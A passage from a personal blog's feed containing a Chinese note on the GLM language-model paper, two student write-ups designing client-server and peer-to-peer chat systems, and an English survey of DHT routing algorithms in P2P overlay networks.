title="Sec.1"></a>Sec.1</h3><ul><li>现有的预训练框架可以分为三类<ul><li>自回归（autoregressive）模型：如GPT[1]，在长文本生成方面很成功，但是无法完全捕捉上下文之间的依赖关系。</li><li>自编码（autoencoding）模型：如BERT[2]，适合NLP任务，但是不能直接应用于文本生成。</li><li>编码器-解码器模型：如T5[3]，统一了NLU和条件生成，但是需要更多的参数匹配基于BERT模型的性能表现。</li></ul></li></ul><h3 id="Sec-2"><a href="#Sec-2" class="headerlink" title="Sec.2"></a>Sec.2</h3><ul><li>GLM 预训练：输入的部分被分为两个部分。A部分是被破坏的文本<code>Xcorrupt</code>，B部分为被sample的部分。B部分中每个span前后分别加上[S]和[E]，训练目标是预测B部分。使用两种位置向量作为输入。Self-attention的mask部分控制attend的位置，蓝色部分即A部分只能attend本身，黄色和绿色部分也即B部分能attend整个A部分以及前面已经生成的部分。</li></ul><center>    <img src="/img/GLM/1.png" width="850"></center><ul><li>多任务预训练：<ul><li>文档级：对单一span取样，长度为原长度均匀分布中的50% - 100%。这一部分旨在长文本生成。</li><li>句子级：限制被mask的span必须是完整句子，取样覆盖15%的原始tokens。这部分旨在预测完成句子和段落的seq2seq任务。</li></ul></li><li>GLM使用的是单一Transformer以及一些改进<ul><li>重新排列了层的归一化和残差连接的顺序。</li><li>使用单一的线性层用于输出token的预测。</li><li>用GeLUs替代ReLU作为激活函数[4]。</li></ul></li><li>2D Positional Encoding： 每一个token由两个位置编码组成<ul><li>第一个位置编码为token在<code>Xcorrucpt</code>中的位置。被mask的token为【MASK】标志的位置。</li><li>第二个位置编码代表其在intra-span中的位置。Part A的token该位置编码为0， Part B的token该位置编码从1到span的长度。</li></ul></li></ul><h3 id="Sec-3"><a href="#Sec-3" class="headerlink" title="Sec.3"></a>Sec.3</h3><ul><li>Finetuning GLM（调优）<ul><li>分类任务（NLU）：参考PET[5]，对于带标签的例子（x，y），将输入 x 转化成为一个包含单一【MASK】的填空题，预测标签 y 映射到这个填空题的答案集中。通过交叉熵（cross-entropy loss）来微调模型。</li><li>文本生成任务：给定的上下文构成输入的A部分，在结尾append一个【MASK】token，以autoregressive模型生成B部分。</li></ul></li></ul><center>    <img src="/img/GLM/2.png" width="850"></center><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>提出了改进型的GLM模型旨在同时适配NLU和长文本生成任务，结合了span shuffling 和 2D positional encoding两处创新。</li><li>分类任务介绍不够详细，详细方法可能需要通过代码实现来佐证。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#5e97f05c3c594f6a8b239acb9463c25b">Alec Radford, Karthik Narasimhan, Tim Salimans, and Ilya Sutskever. 2018a. Improving Language Understanding by Generative Pre-Training.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#c3092c7d95cc4d07b2d8d8abf33b1a84">Jacob Devlin, Ming-Wei Chang, Kenton Lee, and Kristina Toutanova. 2019. BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding. In NAACL 2019, pages 4171–4186.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#1769f3f516414bfa8b6037fe43f2cefc">Colin Raffel, Noam Shazeer, Adam Roberts, Katherine Lee, Sharan Narang, Michael Matena, Yanqi Zhou, Wei Li, and Peter J. Liu. 2020. Exploring the Limits of Transfer Learning with a Unified Text-toText Transformer. J. Mach. Learn. Res., 21:140:1140:67.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#72b2defebc20404aa27ff0bdd290763a">Dan Hendrycks and Kevin Gimpel. 2016. Bridging nonlinearities and stochastic regularizers with gaussian error linear units. CoRR, abs&#x2F;1606.08415.</a></li><li><a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#36a58dc3ea30420c9d91627385988a72">Timo Schick and Hinrich Schütze. 2020a. Exploiting Cloze Questions for Few Shot Text Classification and Natural Language Inference. pages 255–269.</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li><a href="https://github.com/THUDM/GLM">GLM</a></li><li><a href="https://github.com/THUDM/ChatGLM-6B">GLM-6B</a></li><li><a href="https://github.com/THUDM/GLM-130B">GLM-130B</a></li><li>Cloze questions and verbalizers</li></ul><center>    <img src="/img/GLM/3.png" width="850"></center>]]></content>
      
      
      <categories>
          
          <category> Essay </category>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Decentralized Chat Application</title>
      <link href="/2021/11/02/P2PChatSystem/"/>
      <url>/2021/11/02/P2PChatSystem/</url>
      
        <content type="html"><![CDATA[<p>The project is to transform existing chat program into a decentralized chat application.</p><span id="more"></span><h2 id="Discussion-About-the-Shout-Feature"><a href="#Discussion-About-the-Shout-Feature" class="headerlink" title="Discussion About the Shout Feature"></a>Discussion About the Shout Feature</h2><p>The shout command can be used by any user currently joined in a room. Once a peer shouted, all peers in the network includes all peers for which there is a path of connections from shouting peer are supposed to receive a provided message.</p><h3 id="Overall-Design"><a href="#Overall-Design" class="headerlink" title="Overall Design"></a>Overall Design</h3><p>Assume that we have established a peer network as shown in Figure 1. Peer C and peer D are connected to peer B. Peer B is connected to peer A. At a certain time, peer C types a shout command and then sends a Shout Command I to its upstream node peer B. After received the Shout Command I from its downstream node, peer B will send Shout Message to all the downstream nodes that connected to it. Also, peer B will check if it is connecting to other peers. If peer B does connect to another peer as shown in the figure, it will send a Shout Command II to its upstream node.  Then the peer A, as the upstream node of peer B, will do the same thing that is sending Shout Messages to its downstream nodes and Shout Command II to its upstream nodes. In this way, the broadcast of shout messages is achieved.</p><p>This is a brief overall design on Shout feature. The content and format of the command packet and message packet which involve in have been illustrated in the Figure 1.</p><p><img src="/img/P2PChatSystem/Picture1.png" alt="Figure 1"></p><h3 id="Implementation-Details"><a href="#Implementation-Details" class="headerlink" title="Implementation Details"></a>Implementation Details</h3><p>This part focus on the implementation details about the Shout feature. In this project, we are supposed to combine the server part and the client part into one peer. Therefore, I use two threads to handle the different parts separately.</p><p><img src="/img/P2PChatSystem/Picture2.png" alt="Figure 2"></p><p>For the first step, when a peer wants to shout, it will send Shout Command I to its upstream peer through client handle thread. When upstream node’s server thread received a Shout Command, it will first check if there is an identity field in the command packet to distinguish the command’s type. If it’s a Shout Command I, it means that one of the peers connected to the peer wants to shout. Then for the second step, the peer will find the identity of the shout peer and send Shout Message containing the identity of the shout peer to all peers connected to the current peer and joining a room. At the same time, server handle thread will check if the client handle thread is connecting to another peer other than itself. If it does connect to another peer, then the client handle thread will send a Shout Message II containing the identity of shout peer to the upstream peer.</p><p>When a peer received a Shout Message from its upstream peer, there are two things to do. First, the client handle thread will print the shout message on the screen. Second, the peer will send the Shout Message to all the peers that connected to it and joined a room. When a peer received a Shout Command II, there are also two things to do. First, the peer will send Shout Messages filled with the information from the Shout Command II to all the peers which connected to the current peer and joined a room. Second, the peer will check if it is connected to another peer other than itself. If it is connecting to another peer, then it will retweet this Shout Message II to that peer. So on and so forth, the Shout Message can be broadcast through the peer-to-peer network.</p><h3 id="Discussion-About-the-Shout-Feature-Implementation"><a href="#Discussion-About-the-Shout-Feature-Implementation" class="headerlink" title="Discussion About the Shout Feature Implementation"></a>Discussion About the Shout Feature Implementation</h3><p>In the previous description, I introduced the implementation of Shout feature. Overall, this implementation has its cons and pros when facing the general challenges of distributed system.</p><p>For scalability, the bottleneck is performance of the peer. Each peer needs at least two threads to handle the client and server side respectively. If the client uses the #connect command to connect to another peer, an additional thread is needed to receive message from the upstream peer’s server thread in real time. In addition, whenever a new peer connects to the current peer, the server thread creates a new thread to handle the keep-alive socket connect. So, this is where the paradox comes in. The use of threads allows us to easily scale the peer-to-peer network and at the same time becomes a bottleneck that limits the size of the network.</p><p>For concurrency, also threads help the system to control multiple processes with its unique competitive mechanism. The system meets the demand of high concurrency to a certain extent by combing multi-threaded technology with the multi-core and multi-threaded feature of CPU. This allows the system to perform several tasks simultaneously, improving operational efficiency and speeding up data processing. Data consistency is also ensured by lock or message queue techniques.<br>For failure handling, the implementation has many shortcomings. Only the simplest case is presented in the design and implementation, but the actual situation can be very complex. First of all, if a Shout Message or Shout Command is lost during transmission, then starting from the lost peer, subsequent peers will not receive the Shout Message or Command, and there is no means to detect the loss of the packet. Another problem is that if there is a cycle path among the peer-to-peer network, the broadcast of Shout Message will be no end.</p><p><img src="/img/P2PChatSystem/Picture3.png" alt="Figure 3"></p><p>First consider a simple loop as shown in the Figure 3, which is a peer connected to itself. In such case, if the peer received a Shout Command I, it is supposed to send a Shout Command II to itself. This leads to an infinite loop. So, the system will check if the current peer is connected to itself, then decide whether it is necessary to send the Shout Command II packet.</p><p>When considering another slightly more complex loop as shown in the Figure 3-4, this broadcast loop issue will be difficult to solve. Peer A sends Shout Command I to peer C, peer C responses with Shout Message and sends the Shout Message to peer B. Also, peer C sends Shout Command II to peer D. In the meanwhile, peer D sends Shout Command II to peer A. After peer A receives the Shout Command II from peer D, it will transfer this Shout Command II to peer C. And so, the cycle continues endlessly.</p><p><img src="/img/P2PChatSystem/Picture4.png" alt="Figure 4"></p><p>For security, there are several security issues in the implementation. First, all the packets are not encrypted, hackers could easily get some information through listening the communication channel. Second, hackers could hijack the packet, modify the content, and replay the new packet. Finally, hackers could create multiple peers and shout at a same time. The broadcast message may greatly increase the network load, and even crash the network.</p><h2 id="Discussion-About-the-Decentralized-Model"><a href="#Discussion-About-the-Decentralized-Model" class="headerlink" title="Discussion About the Decentralized Model"></a>Discussion About the Decentralized Model</h2><p>As discussed before, the peer will create two threads initially. The server thread is waiting for other peers’ socket connection and the client thread is used for handling user commands.</p><p>User could use #help command to get some help. The system will list all available commands. Only the peer owner could use #createroom command to create a new chat room on the current peer. User could use #list command to list all the chat room on the current peer. #who command is used for list all the members in a chat room. The peer owner could use #kick command to kick a peer from the current peer and the system will add its IP into blacklist. Therefore, the kicked peer is blocked from reconnecting. User could user #delete command to delete a room from current peer. #listneighbors command is used for listing the neighbors of current peer. #searchnetwork command will crawl over all the accessible peer in the peer-to-peer network automatically. User could use #quit command to quit the system.</p>]]></content>
      
      
      <categories>
          
          <category> Program </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Routing in P2P Overlay Networks</title>
      <link href="/2021/09/17/RoutingInP2P/"/>
      <url>/2021/09/17/RoutingInP2P/</url>
      
        <content type="html"><![CDATA[<p>[Abstract] P2P (Peer-to-Peer) overlay network is one of the most popular distributed networks. It not only has advantages in scalability, but also can maximize the use of computing and storage resources of each terminal nodes. In the last ten years, P2P system is a hot topic in IT field. Recently, most researchers study structed P2P system, which is better than the former P2P structure. This paper focus on the routing algorithms based on DHT in second generation of P2P overlay networks.</p><span id="more"></span><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><p>The emergence of P2P system is the consequence of the rapid development of Internet. The world’s population is increasing, and technology is also improving. The demand for Internet services is also expanding. Traditional network can only expand its service scope by increasing the number of servers, while the purchase and maintenance of servers will increase the costs of service providers and consume a lot of resources. In addition, the single server needs to extend the network bandwidth to expand the number of services. This is also one of the limiting factors in the traditional network itself. </p><p>Peer-to-Peer system is an instance of distributed system. Unlike traditional network architecture, there is no concept of centralized control in P2P system. In other words, each terminal node in this type of network is both the service provider and user. Peer-to-peer systems aim to support useful distributed services and applications using data and computing resources available in the personal computers and workstations that are present on the Internet and other networks in ever-increasing numbers [1].</p><p>In the P2P system, resources are stored in the nodes of the network. The structured overlay network is responsible for routing between any two P2P nodes. In the first generation of structured overlay network algorithms, each node records all other nodes’ pointer (one hop overlay), so that most of the message communication can be completed directly. These algorithms are suitable for small scale networks. In the second generation of structured overlay network algorithms, each node only records a small number of pointers of other nodes. The algorithms ensure that the message routing is completed within a certain number of hops. Typical algorithms such as Chord, Pastry, Tapestry and CAN. This paper mainly introduces the second generation of structured overlay network algorithm, then analyzes and compares its performance.</p><h2 id="2-Routing-Overlays"><a href="#2-Routing-Overlays" class="headerlink" title="2.Routing Overlays"></a>2.Routing Overlays</h2><p>Routing overlay is a distributed algorithm in P2P system which takes responsibility for locating nodes and objects. Peer-to-peer systems usually store multiple replicas of objects to ensure availability. In that case, the routing overlay maintains knowledge of the location of all the available replicas and delivers requests to the nearest ‘live’ node (i.e., one that has not failed) that has a copy of the relevant object [1].</p><h3 id="2-1-DHT"><a href="#2-1-DHT" class="headerlink" title="2.1.DHT"></a>2.1.DHT</h3><p>In P2P overlay networks, each object has unique GUID (Globally Unique Identifier). This value is calculated by a hash function (such as SHA-1) according to all or part of the state of the object. Because of this, routing overlay networks are sometimes called distributed hash tables (DHT).</p><p>In DHT model, a data item with a GUID of X will be stored in a node whose GUID is closest to X in value. Copies of the data item will also be stored on R hosts. The GUID of these hosts is last close to X, and R is the replication factor to ensure high availability.</p><p>The GUIDs cannot be read artificially, so you must get the object’s GUID through some indexing services. Then, the P2P system will find the location of these objects in the overlay networks through the following routing algorithms.</p><h3 id="2-2-Pastry"><a href="#2-2-Pastry" class="headerlink" title="2.2.Pastry"></a>2.2.Pastry</h3><p>Pastry is a network structure using DOLR (Distributed Object Location and Routing) technology. Messages are routed according to the keywords provided. In pastry, each node is assigned a 128 bits ID which is generated by the unified hash function according to the IP address or public host name of the node.</p><p>Each node has a routing table, a set of neighboring nodes and a set of leaf nodes. The IP address of the node is included in the routing table, and the first n bits of the ID of these nodes are the same, where n is the number of rows of the entry in the routing table. The IP addresses listed in the neighbor node set, and the corresponding IDs of these nodes are very similar to those of the nodes with the routing table. The ID of the node in the leaf node set is smaller than that of the node. Both routing table and leaf node set are used to route messages, but neighbor node set is only used to keep nodes locatable. When a node receives a message that it should route, it first checks the leaf node set, followed by the routing table. With the progress of routing, the ID gradually approaches the ID of the target node, and finally the message arrives at the target node.</p><h3 id="2-3-Tapestry"><a href="#2-3-Tapestry" class="headerlink" title="2.3.Tapestry"></a>2.3.Tapestry</h3><p>Tapestry is another network structure using DOLR technology. Each tapestry node contains pointers to other nodes and maps between the object’s GUID and node ID. Queries are routed along nodes of adjacent links until appropriate object pointers are found.</p><p>Tapestry network is a multi-node overlay network. Each tapestry node contains links to the set of neighbors with the shared node ID prefix. The neighbor nodes of a node constitute the neighbor node set. All the sets come together to form a routing table. When you want a node to publish an object, a mapping message will be sent to the target node whose node ID is closest to the object ID. When a node searches for an object, it is not necessary to find the target node that is close to or matches the object. It is only necessary to find the node that has the location information of the object.</p><h3 id="2-4-Chord"><a href="#2-4-Chord" class="headerlink" title="2.4.Chord"></a>2.4.Chord</h3><p>Chord algorithm is very simple. It uses a keyword to identify the file and stores the file on the node corresponding to the keyword. Chord stores keywords on the corresponding nodes in chord by using the consistent hash function. Each node in chord only needs to know the routing messages of a few other nodes. This is because the routing table in chord is decentralized, and each node gets path information by communicating with a few other nodes.</p><h3 id="2-5-CAN"><a href="#2-5-CAN" class="headerlink" title="2.5.CAN"></a>2.5.CAN</h3><p>CAN (Content-Addressable Network) is also a network structure that maps keywords to nodes. CAN uses multidimensional identifier space to implement DHT algorithm. CAN maps all nodes into an n-dimensional Cartesian space and allocates a region to each node as evenly as possible. CAN uses hash function to hash the K in (K, V) pair to get a point in Cartesian space, and stores the (K, V) pair in the node which has the region of the point. The routing algorithm adopted by CAN is relatively direct and simple. After finding out the coordinates of the target point, it will send the request to the node whose coordinates are closest to the target point.</p><p>Each node in CAN system maintains a routing table, which stores the IP address and coordinate area of adjacent nodes. When looking for messages, the node routes the lookup message to the neighbor node closest to the coordinate of the target node.</p><h2 id="3-Comparison"><a href="#3-Comparison" class="headerlink" title="3.Comparison"></a>3.Comparison</h2><p>In this section, the paper will compare overlay networks with traditional networks and different overlay networks algorithms we mentioned in section 2.</p><h3 id="3-1-Comparison-of-Overlay-Networks-and-Traditional-Networks"><a href="#3-1-Comparison-of-Overlay-Networks-and-Traditional-Networks" class="headerlink" title="3.1.Comparison of Overlay Networks and Traditional Networks"></a>3.1.Comparison of Overlay Networks and Traditional Networks</h3><p>When it comes to the traditional network, the first thing to think of is the TCP&#x2F;IP model. First, in terms of scale, the overlay network allows more usable space. Second, the placement of overlay network objects can be randomized, unlike the traditional network traffic model, which is associated with network topology. Thirdly, the update speed of overlay network routing table is much faster than that of traditional network. Fourth, in traditional networks, the target node is usually unique. While in overlay networks, it is enough to find the nearest copy of the target object. Finally, because the biggest characteristic of P2P network is decentralization, it has advantages in security and privacy compared with traditional networks.</p><h3 id="3-2-Comparison-of-Different-Routing-Algorithms-Based-on-DHT"><a href="#3-2-Comparison-of-Different-Routing-Algorithms-Based-on-DHT" class="headerlink" title="3.2.Comparison of Different Routing Algorithms Based on DHT"></a>3.2.Comparison of Different Routing Algorithms Based on DHT</h3><p>Obviously, the management of P2P system based on centralized directory mechanism is simpler. The bandwidth cost of maintaining the network is also smaller. However, because the server needs to centrally manage all the node information of the whole network, the performance and network liaison of the server will become the bottleneck of the whole system. The robustness of distributed P2P system is strengthened, and it will not cause the network paralysis because of the failure of a few nodes. Neither Napster nor Gnutella can ensure that the target node is found through an attempt. Servers in Napster may be paralyzed, and file location failure may occur due to the limit of flooding times in Gnutella. The DHT algorithm of structured coverage network can solve these problems.</p><p>Several algorithms based on DHT are similar in scalability, distribution, load balancing and self-organization. But it is different in some ways. Chord provides a naming mechanism, the consistency problem when nodes join and the treatment when nodes fail are relatively perfect. Chord can be used in large-scale file sharing network, time sharing effective storage system and large-scale distributed computing platform. Chord, Pastry and Tapestry all have the same number of search hops, and the length of CAN search path is relatively longer, so it is not suitable for voice phone and real-time information service. However, due to the good scalability index mechanism of CAN network, it can effectively support content insertion and retrieval.</p><p>The following table comprehensively compares the four algorithms mentioned in this paper from several aspects.</p><table><thead><tr><th align="center">Algorithms</th><th align="center">Insertion complexity</th><th align="center">Spatial complexity</th><th align="center">Average searching hops</th></tr></thead><tbody><tr><td align="center">Pastry</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td></tr><tr><td align="center">Tapestry</td><td align="center">O(log<sub>b</sub>⁡N)</td><td align="center">O(Nlog<sub>b</sub>⁡N)</td><td align="center">O(log<sub>b</sub>⁡N)</td></tr><tr><td align="center">Chord</td><td align="center">O(log<sub>2</sub>⁡N)</td><td align="center">O(Nlog<sub>2</sub>⁡N)</td><td align="center">O(log<sub>2</sub>⁡N)</td></tr><tr><td align="center">CAN</td><td align="center">O(d)</td><td align="center">O(d)</td><td align="center">dN<sup>1&#x2F;d</sup></td></tr></tbody></table><p>Illustration:</p><ul><li>b is the length of the identifier.</li><li>N is the scale of the network.</li><li>d is the dimension of coordinate space.</li></ul><h2 id="4-Conclusions-and-Future-Directions"><a href="#4-Conclusions-and-Future-Directions" class="headerlink" title="4.Conclusions and Future Directions"></a>4.Conclusions and Future Directions</h2><p>At this stage, the main research work is around the current algorithm, which shows that the current routing and location algorithms need to be further improved. The delay of searching in chord network and the fault-tolerant mechanism in case of failure nodes need to be improved. When malicious nodes appear in can network, the validity of data also needs to be improved. Now a lot of research is to improve the existing Chord, Pastry, Tapestry and CAN network algorithm. But at present, there are also some new network structures and corresponding algorithms based on the existing network algorithms and combining the advantages of several algorithms.</p><p>Another research hotspot is to improve the performance of overlay network by using the physical distribution characteristics of nodes. Because in the above four network structures, the logical ID of the node in the overlay network is obtained by hashing according to the information of the node, which basically ignores the physical distribution characteristics of the node. Many new studies have improved and perfected this aspect.</p><p>There are two directions for successful P2P applications. One is blockchain applications, such as bitcoin. The other is file sharing applications, such as BitTorrent. The application prospect of overlay network is very bright, and the problems to be solved are also prominent and urgent. Therefore, further research in this field will be very valuable.</p><h2 id="5-References"><a href="#5-References" class="headerlink" title="5.References"></a>5.References</h2><ul><li><p>[1]Coulouris, G. ,  Dollimore, G. ,  Kindberg, J. , &amp;  Blair, T. . (2012). Distributed Systems: Concepts and Design (5th Edition).</p></li><li><p>[2]Chen, G. ,  Xu, C. Z. ,  Shen, H. , &amp;  Chen, D. . (2003). P2P Overlay Networks of Constant Degree. Grid &amp; Cooperative Computing, Second International Workshop, Gcc, Shanghai, China, December, Revised Papers.</p></li><li><p>[3]Stoica, I. ,  Morris, R. T. ,  Karger, D. ,  Kaashoek, F. , &amp;  Balakrishnan, H. . (2001). Chord : a scalable peer-to-peer lookup service for internet applications. ACM SIGCOMM Computer Communication Review, 31.</p></li><li><p>[4]Peng, X. Y., Yang, S. B., &amp; Chen, D. F.. (2004). Mcan:  A Scalable Modified Content -Addressable Network. Computer Science (11), 130-134.</p></li><li><p>[5]（2006). Analysis of structured P2P overlay networks algorithms based on DHT. Journal of Chongqing University, 000(0z1), 131-134.</p></li><li><p>[6]Yang, Y. H. . (2014). Compare with Algorithms of P2P Resource Location based on DHT. Information Security and Technology.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Security Framework </category>
          
          <category> P2P </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Routing </tag>
            
            <tag> Peer-to-Peer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Simple Chat System</title>
      <link href="/2021/09/17/ChatSystem/"/>
      <url>/2021/09/17/ChatSystem/</url>
      
        <content type="html"><![CDATA[<p>This is a simple example of distributed system implementation.</p><span id="more"></span><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><p>The project is to create a C&#x2F;S architectural model-based chat system. The chat system consists of a chat server and one or more chat clients. The chat server is able to accept multiple incoming TCP connections. The chat server can create a new chat room and move between existing chat rooms. Messages sent by a chat client will be broadcast to all clients which are in the same chat room.</p><h2 id="2-Protocol-Implementation"><a href="#2-Protocol-Implementation" class="headerlink" title="2.Protocol Implementation"></a>2.Protocol Implementation</h2><p>There are 8 protocols needs to be implemented in this chat system. At the beginning when a client connects to the server, the server will response with some initialized messages. After the socket is established, the client would be able to change identity, join rooms, ask for room list and room content information, create room, delete room, send messages, and quit the service. The following figures show how the server and client react to the eight protocols.</p><p><img src="/img/ChatSystem/Picture1.png" alt="Protocol diagram of the chat server"></p><p><img src="/img/ChatSystem/Picture2.png" alt="Protocol diagram of the chat client"></p><h3 id="2-1-Initialization"><a href="#2-1-Initialization" class="headerlink" title="2.1.Initialization"></a>2.1.Initialization</h3><p>The server will listen to the specified port. Once a client connects to the server, the server will start a thread to handle this socket and do following things:</p><ul><li>1.Responds with NewIdentity message.</li><li>2.Moves the client into MainHall.</li><li>3.Sends RoomChange message to all the clients in the MainHall.</li><li>4.Sends RoomList message to the client.</li><li>5.Sends RoomContent message to the client.</li></ul><p>Illustrated by the following figure:</p><p><img src="/img/ChatSystem/Picture3.png" alt="Initialization between the server and clients"></p><h3 id="2-2-Identity-Change-Protocol"><a href="#2-2-Identity-Change-Protocol" class="headerlink" title="2.2.Identity Change Protocol"></a>2.2.Identity Change Protocol</h3><p>When client sends a IdentityChange message to the server, the server will respond with a NewIdentity message. If the client wants to change to an invalid or existed identity, the value of former and identity field in NewIdentity message is same. And this NewIdentity message is only sent to the corresponding client. Otherwise, server will broadcast this NewIdentity message to all clients in the same chat room.</p><p><img src="/img/ChatSystem/Picture4.png" alt="Identity Change Protocol between the server and clients"></p><h3 id="2-3-Join-Room-Protocol"><a href="#2-3-Join-Room-Protocol" class="headerlink" title="2.3.Join Room Protocol"></a>2.3.Join Room Protocol</h3><p>When client sends a Join message to the server, the server will respond with a RoomChange message. If the client wants to join an invalid or non-existed room, the value of former and roomid in RoomChange message is same. And this RoomChange message is only sent to the corresponding client. Otherwise, server will broadcast this RoomChange message to all clients in the former and changed room. If client joins the MainHall, server will also send RoomList message and RoomComtents message after RoomChange message.</p><p><img src="/img/ChatSystem/Picture5.png" alt="Join Room Protocol between the server and clients"></p><h3 id="2-4-Create-Room-Protocol"><a href="#2-4-Create-Room-Protocol" class="headerlink" title="2.4.Create Room Protocol"></a>2.4.Create Room Protocol</h3><p>When client sends a CreateRoom message, the server will respond with a RoomList message. If the client wants to create a valid room, the server will respond with a RoomList message with the new room in the list.</p><p><img src="/img/ChatSystem/Picture6.png" alt="Create Room Protocol between the server and clients"></p><h3 id="2-5-Room-Content-Protocol"><a href="#2-5-Room-Content-Protocol" class="headerlink" title="2.5.Room Content Protocol"></a>2.5.Room Content Protocol</h3><p>When client sends a Who message, the server will respond with a RoomContents Message.</p><p><img src="/img/ChatSystem/Picture7.png" alt="Room Content Protocol between the server and clients"></p><h3 id="2-6-Room-List-Protocol"><a href="#2-6-Room-List-Protocol" class="headerlink" title="2.6.Room List Protocol"></a>2.6.Room List Protocol</h3><p>When client sends a List message, the server will respond with a RoomList message.</p><p><img src="/img/ChatSystem/Picture8.png" alt="Room List Protocol between the server and clients"></p><h3 id="2-7-Message-Protocol"><a href="#2-7-Message-Protocol" class="headerlink" title="2.7.Message Protocol"></a>2.7.Message Protocol</h3><p>When client input anything except for the commands, the client will take the input as messages and send the Message to the server. Then server will broadcast the Message to all clients in the same room.</p><p><img src="/img/ChatSystem/Picture9.png" alt="Message Protocol between the server and clients"></p><h3 id="2-8-Delete-Room-Protocol"><a href="#2-8-Delete-Room-Protocol" class="headerlink" title="2.8.Delete Room Protocol"></a>2.8.Delete Room Protocol</h3><p>When client sends Delete message, the server will do the following things:</p><ul><li>1.Check whether the room is existed, and the owner is the client or not.</li><li>2.If all conditions are met, server will move all users in that room to the MainHall and delete the room. Also, the server will send RoomChange message as well as RoomList message and RoomContents message to these clients.</li><li>3.Send RoomList message to the client which want to delete a room.</li></ul><p><img src="/img/ChatSystem/Picture10.png" alt="Delete Room Protocol between the server and client"></p><h3 id="2-9-Quit-Protocol"><a href="#2-9-Quit-Protocol" class="headerlink" title="2.9.Quit Protocol"></a>2.9.Quit Protocol</h3><p>Client just sends a Quit message to the server then shut down the program. If the client owns a room, then the server will remove the owner of this room. After that server will remove this client from its current room and check if it is the last client in that room. Server will delete that room if that room is empty, and its owner is also disconnected from the server. At last server removes the client socket from the socket list.</p><h2 id="3-Discussion-About-Concurrency"><a href="#3-Discussion-About-Concurrency" class="headerlink" title="3.Discussion About Concurrency"></a>3.Discussion About Concurrency</h2><p>Concurrency is an important feature of distributed system. Both services and applications provide resources that can be shared by clients in a distributed system. In this chat system, some concurrency has been realized, but there are also some problems have not been resolved when dealing with some concurrency.</p><p>First let’s discuss about the concurrency that the system has implemented. When the server starts, it will listen on the specified port. Once there is a socket connection request from the client, the server will create a new thread to process it. At the same time, the main program of the server is still listening to the specified port and waiting for a new socket connection request from another client. Different socket connections are processed by different threads and do not interfere with each other, so services and applications allow multiple client requests to be processed concurrently.</p><p>However, the concurrency implemented in this system is extremely limited. Next let’s discuss the limitation of the current system. First, the system does not consider high concurrency. After the client establishes a socket connection with the server, the thread handling the socket connection will run until the client actively exits the system. Although threads may occupy very few resources, the performance of the server is limited, and thread resources are limited as well. This will make it difficult for the system to deal with high concurrency. Second, there is no lock mechanism for access to shared resources in the system. Therefore, theoretically, different processes may operate on the same resource at the same time, which may lead to conflicts and inconsistent results. For example, if two users want to create a room with the same name at the same time, unpredictable error results may occur. Therefore, lock mechanism should be introduced to ensure the safe use of shared resources in a concurrent environment.</p><p>Similarly, the client also processes its socket connection with the server by thread. The client needs to listen to the user’s input and process the messages sent by the server at any time. This is the concurrency problem faced by the client. However, this chat system does not solve this problem, but processes user input and server pushed messages in the same thread. It may take two threads to deal with these two things separately. Then, like the server, this processing method also faces the same problem of accessing shared resource. In addition, if the user is entering something and the server pushes a message, it is also a problem how the separate thread scheme handles the situation.</p><h2 id="4-Multi-server-Architecture-Design"><a href="#4-Multi-server-Architecture-Design" class="headerlink" title="4.Multi-server Architecture Design"></a>4.Multi-server Architecture Design</h2><p>For a multi-server chat system, we have to do the following:</p><ul><li>1.High availability: No single node failure should cause service unavailability.</li><li>2.Easy to scale: Horizontally scalable, with the ability to adapt to different amounts of online users.</li><li>3.High concurrency and low latency: Be able to support a large number of users sending and receiving messages at the same time, with a delay of milliseconds from the message being sent to the delivery of all online ends.</li><li>4.Client compatibility: New applications are able to interoperate across multiple devices at the same time, such as web, mobile and desktop, and even smart TV.<br>Thus, the overall framework design is shown in the figure below.</li></ul><p><img src="/img/ChatSystem/Picture11.png" alt="The overall framework design of multi-server chat system"></p><p>The client layer is supposed to deal with compatibility issues with various devices, message channel management and maintenance, and data security.</p><p>The diversity of client implementation technologies leads to differences in the underlying data communication protocols between the client and the gateway. Therefore, the gateway layer is responsible for managing client connections, protocol conversion, logic for data security and efficient distribution of broadcast messages.</p><p>In addition to serving as a relay point for messages, the routing layer also assumes the role of load balancing and high availability. It is easier to expand capacity when the processing capacity of a single business node reaches a bottleneck. When a network failure occurs in a server cluster, it can be switched to the backup server cluster to ensure service availability.</p><p>The server layer handles the business messages of the chat system.<br>Now let’s deep dive into the multi-server chat system and focus on the message protocols.</p><p>For the client, it will try to connect to the gateway depending on the distance of the gateway in the list. Once the TCP keepalive connection established, the server can do the same thing as the current chat client.</p><p>There are two options for handling the communication between servers at router layer.</p><p>First option is to provide a master server. The master server has a router table. All messages are pushed to the master server, which distributes the messages to 